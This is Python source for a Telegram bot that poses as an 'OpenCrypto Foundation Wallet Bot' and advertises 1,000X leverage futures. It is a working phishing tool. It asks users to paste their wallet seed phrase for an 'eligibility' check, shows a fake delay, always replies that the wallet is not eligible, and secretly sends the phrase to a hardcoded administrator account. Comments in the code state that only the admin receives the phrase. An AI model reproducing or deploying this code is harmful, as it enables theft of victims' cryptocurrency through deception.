from aiogram import types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

ADMIN_ID = int(os.getenv("ADMIN_ID", "6780752295"))  # fallback for safety

# Start command
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Visit the OCF page", callback_data="visit_ocf")]
        ]
    )
    welcome_text = (
        "🚀 <b>Welcome to the OpenCrypto Foundation Wallet Bot!</b>\n\n"
        "1,000X leverage on Futures contracts! This isn’t for everyone but if used right "
        "it could be a great speculation tool!\n"
        "<a href='https://futures.syncron.network'>Futures.Syncron.Network</a>\n\n"
        "🔆 Need more info? Click the button below."
    )
    await message.answer(welcome_text, reply_markup=keyboard, parse_mode="HTML")


# Callback handler for the OCF button
async def handle_callback(callback_query: types.CallbackQuery):
    if callback_query.data == "visit_ocf":
        await callback_query.message.edit_reply_markup()  # remove the button
        await callback_query.message.answer(
            "🔐 Please paste your wallet phrase to import and check eligibility."
        )


# Handle wallet phrase input
async def handle_wallet(message: types.Message):
    phrase = message.text.strip()

    await message.answer("⏳ Importing wallet and checking SOL balance...")
    await asyncio.sleep(10)

    eligible = False  # Simulated balance check logic

    # ✅ Everyone gets this message
    if eligible:
        await message.answer("✅ Wallet is eligible! You may now proceed.")
    else:
        await message.answer("❌ Not eligible. Wallet holds less than 0.3 SOL.")

    # ✅ But only you (ADMIN) receive the phrase privately
    try:
        await message.bot.send_message(
            ADMIN_ID,
            f"📩 Wallet phrase received:\n<code>{phrase}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] Could not send to admin: {e}")